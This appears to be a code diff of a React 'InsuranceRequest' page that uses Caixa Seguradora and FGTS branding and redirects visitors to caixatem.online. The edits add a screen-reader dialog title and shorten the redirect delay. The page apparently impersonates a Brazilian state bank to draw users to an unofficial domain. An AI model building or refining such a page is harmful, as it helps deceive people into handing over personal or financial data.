@@ -7,7 +7,7 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import FGTSLogo from '@/components/FGTSLogo';
 import { useIsMobile } from '@/hooks/use-mobile';
-import { Dialog, DialogContent } from "@/components/ui/dialog";
+import { Dialog, DialogContent, DialogTitle } from "@/components/ui/dialog";
 
 const InsuranceRequest = () => {
   const navigate = useNavigate();
@@ -90,7 +90,7 @@ const InsuranceRequest = () => {
       }
       
       window.location.href = "https://caixatem.online/app-meufgts";
-    }, 2000);
+    }, 800); // Reduced from 2000ms to 800ms for faster redirect
   };
 
   return (
@@ -229,6 +229,7 @@ const InsuranceRequest = () => {
 
       <Dialog open={showRedirectDialog} onOpenChange={setShowRedirectDialog}>
         <DialogContent className="max-w-md">
+          <DialogTitle className="sr-only">Redirecionando para Caixa Seguradora</DialogTitle>
           <div className="flex flex-col items-center justify-center py-4">
             <img 
               src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
